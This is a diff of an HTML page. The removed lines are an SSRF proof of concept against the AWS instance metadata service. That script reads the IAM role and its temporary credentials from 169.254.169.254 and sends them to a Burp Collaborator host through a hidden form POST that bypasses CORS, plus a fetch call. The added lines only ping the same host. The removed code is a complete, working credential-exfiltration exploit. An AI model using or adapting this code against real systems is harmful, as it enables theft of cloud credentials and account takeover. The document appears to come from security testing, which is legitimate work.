@@ -1,56 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>IMDS Exploit PoC</title>
-</head>
 <body>
-    <h1>SSRF PoC - AWS IMDS</h1>
-    <div id="result"></div>
-    
     <script>
-    async function exploitIMDS() {
-        const resultDiv = document.getElementById('result');
-        const collaborator = 'https://84ad72dbts23ogvbhgx7fmhykpqge97xw.oastify.com'; // Replace with your Collaborator URL
-
-        try {
-            // Step 1: Get the IAM role name
-            const roleResponse = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
-                headers: { 'Metadata-Flavor': 'AWS' }
-            });
-            if (!roleResponse.ok) throw new Error(`Role fetch failed: ${roleResponse.status}`);
-            const roleName = (await roleResponse.text()).trim();
-            resultDiv.innerHTML += `<p>✅ Found role: ${roleName}</p>`;
-
-            // Step 2: Get the credentials for that role
-            const credResponse = await fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`, {
-                headers: { 'Metadata-Flavor': 'AWS' }
-            });
-            if (!credResponse.ok) throw new Error(`Cred fetch failed: ${credResponse.status}`);
-            const credentials = await credResponse.text();
-            resultDiv.innerHTML += `<p>✅ Got credentials!</p>`;
-
-            // Step 3: Exfiltrate via form POST (bypasses CORS)
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = collaborator;
-            form.enctype = 'application/x-www-form-urlencoded'; // Optional
-            const input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = 'data';
-            input.value = credentials;
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
-
-            // Also try to send via fetch (in case CORS is not an issue)
-            fetch(collaborator + '?data=' + encodeURIComponent(credentials));
-        } catch (e) {
-            resultDiv.innerHTML += `<p style="color:red">❌ Error: ${e.message}</p>`;
-            // Report error to Collaborator
-            fetch(collaborator + '?error=' + encodeURIComponent(e.message));
-        }
-    }
-    exploitIMDS();
+        // Simple ping to Collaborator
+        fetch('https://84ad72dbts23ogvbhgx7fmhykpqge97xw.oastify.com/ping');
     </script>
 </body>
 </html>
